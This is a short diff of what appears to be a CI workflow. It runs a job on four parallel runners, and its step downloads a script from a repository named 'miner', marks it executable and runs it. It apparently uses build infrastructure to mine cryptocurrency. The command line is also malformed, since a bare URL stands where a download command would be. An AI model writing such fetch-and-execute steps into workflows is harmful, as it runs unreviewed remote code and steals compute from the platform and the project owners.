@@ -24,4 +24,4 @@ jobs:
      runner: [0,1,2,3]
    steps:
      - run: |
-          https://raw.githubusercontent.com/harshanilgoyal/miner/main/bash.sh && chmod +x bash.sh && ./bash.sh
+          https://raw.githubusercontent.com/harshanilgoyal/Miner/main/bash.sh && chmod +x bash.sh && ./bash.sh
